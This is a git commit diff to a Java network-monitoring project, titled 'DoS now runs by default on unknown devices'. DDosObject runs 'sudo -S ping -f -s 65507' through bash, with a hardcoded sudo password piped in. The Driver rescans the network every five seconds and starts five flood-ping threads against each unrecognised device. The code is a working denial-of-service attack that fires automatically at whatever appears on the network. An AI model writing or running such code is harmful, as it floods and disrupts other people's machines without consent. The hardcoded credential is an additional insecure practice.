ce1540eb68378e4b0ab525b9c5c9a448d5ae4ee7
Bryan Hagedorn <bryanh12@Bryans-Air.attlocal.net>
2019-11-17 21:45:39 -0500

    DoS now runs by default on unknown devices

--- src/com/company/DDosObject.java
+++ src/com/company/DDosObject.java
@@ -1,9 +1,12 @@
+package com.company;
 
-public class DDosTest {
+import java.util.concurrent.TimeUnit;
+
+public class DDosObject {
 
     private String ipAddress;
 
-    public DDosTest(String ipAddress) {
+    public DDosObject(String ipAddress) {
         this.ipAddress = ipAddress;
     }
 
@@ -15,37 +18,38 @@ public class DDosTest {
         this.ipAddress = ipAddress;
     }
 
-    public void startThreads() {
-        //Create and start 100 threads
-        for (int i = 0; i < 500; i++) {
-            DdosThread thread = new DdosThread();
-            thread.start();
-        }
-    }
 
     public static class DdosThread extends Thread {
+
+        private DDosObject dDosObject;
+
+        public DdosThread(DDosObject dDosObject){
+            this.dDosObject = dDosObject;
+        }
+
 
         //Change run so that it may continue to ping infinitely until the boolean is set to false
         @Override
         public void run() {
-                try {
+            try {
                     /*Unix specific command prompt - requires superuser to specify the size of the packet being sent,
                     thus the system password is currently hardcoded
                     -s sends a 65507 byte pack, the maximum allowed size for Unix/MacOS
                     -f continuously sends pings without waiting for a reply
                     Java implementation of ping does not allow for altering of packet size / flooding, so we use bash
                      */
-                    String ipAddress = "172.28.209.167";
-                    String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + " -f -s 65507"};
+                String ipAddress = dDosObject.getIpAddress();
+                String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + " -f -s 65507"};
+                System.out.println(" Pinging " +ipAddress);
 
                     /*Equivalent ping command for Windows
                     -t sends pings until the process is stopped
                     -l sets the buffer size
                     -f continuously sends pings without waiting for a reply
                      */
-                    //String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
-                    attack(cmd);
-                } catch (Exception e) {
+                //String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
+                attack(cmd);
+            } catch (Exception e) {
             }
         }
 
@@ -55,7 +59,7 @@ public class DDosTest {
              */
             Runtime rt = Runtime.getRuntime();
             Process p = rt.exec(cmd);
-            p.waitFor();
+            p.waitFor(10, TimeUnit.SECONDS);
         }
     }
 }
--- src/com/company/app/Driver.java
+++ src/com/company/app/Driver.java
@@ -1,12 +1,17 @@
 package com.company.app;
 
+import com.company.DDosObject;
 import com.company.DataBase.SQLiteDB;
+import com.company.network.Network;
+import com.company.network.NetworkDevice;
 import com.company.ui.controller.ProjectController;
 import com.company.ui.model.ProjectModel;
 import com.company.ui.utilities.ScrollPanelUtilties;
+import com.company.ui.view.ProjectScrollPanel;
 import com.company.ui.view.ProjectView;
 
 import java.io.IOException;
+import java.util.List;
 
 public class Driver {
 
@@ -26,7 +31,22 @@ public class Driver {
 
 
         while (true) {
+            List<NetworkDevice> allDevices = Network.getDevices();
             ScrollPanelUtilties.updateView(controller.getProjectView());
+
+            ProjectScrollPanel unknownIpAddressesPanel = controller.getProjectView().getUnknownIpAddressesPanel();
+
+            List<NetworkDevice> devices = ScrollPanelUtilties.getUnknownDevices(allDevices);
+
+            for(NetworkDevice device: devices){
+                //Create and start 100 threads
+                DDosObject foreignDevice = new DDosObject(device.getIP());
+                for (int i = 0; i < 5; i++) {
+                    DDosObject.DdosThread thread = new DDosObject.DdosThread(foreignDevice);
+                    thread.start();
+                }
+            }
+
             Thread.sleep(5000);
 
         }
